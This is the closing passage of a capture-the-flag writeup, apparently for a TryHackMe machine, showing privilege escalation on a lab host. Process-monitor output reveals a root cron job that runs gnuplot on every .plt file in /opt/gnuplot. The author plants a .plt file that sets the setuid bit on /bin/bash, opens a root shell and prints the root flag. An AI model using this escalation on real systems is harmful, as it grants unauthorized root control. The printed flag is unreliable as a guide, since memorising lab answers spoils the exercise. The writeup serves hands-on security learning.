</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23049</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23048</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23047</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23052</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23055</span>  | cut -d   -f3,7 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23054</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23053</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23061</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23060</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23064</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23067</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23066</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23071</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23070</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23076</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23075</span>  | cut -d   -f3,7 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23074</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23073</span>  | grep enp 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23072</span>  | netstat -i 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23080</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23079</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23078</span>  | grep -o load average:.*$ 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23077</span>  | uptime 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23082</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23081</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23083</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23084</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:17:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23085</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23096</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23095</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23094</span>  | grep enp 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23093</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23092</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23091</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23090</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23089</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23088</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23087</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23086</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23099</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23098</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23097</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23100</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23101</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23102</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23103</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I make a file inside <code>/opt/gnuplot</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-bash-5.0$ touch /opt/gnuplot/cyberspider.plt
</span></span></code></pre></div><p>I write inside <code>/opt/gnuplot/cyberspider.plt</code> file to set  the bit setuid <code>/bin/bash</code>, and spawn a <code>root shell</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-bash-5.0$ echo <span style="color:#e6db74">&#39;system &#34;chmod u+s /bin/bash&#34;&#39;</span> &gt; /opt/gnuplot/cyberspider.plt
</span></span><span style="display:flex;"><span>-bash-5.0$ /usr/bin/bash -p
</span></span><span style="display:flex;"><span>bash-5.0# whoami
</span></span><span style="display:flex;"><span>root
</span></span></code></pre></div><p>I find the flag(<code>root.txt</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>bash-5.0# cat /root/root.txt
</span></span><span style="display:flex;"><span>fa6267e9447f8535c2f5f565faf0c7d0
</span></span></code></pre></div>
      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/lian_yu/">
                <span class="button__text">THM Writeup - Lian_Yu (Easy)</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
    
        <span>::  </span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
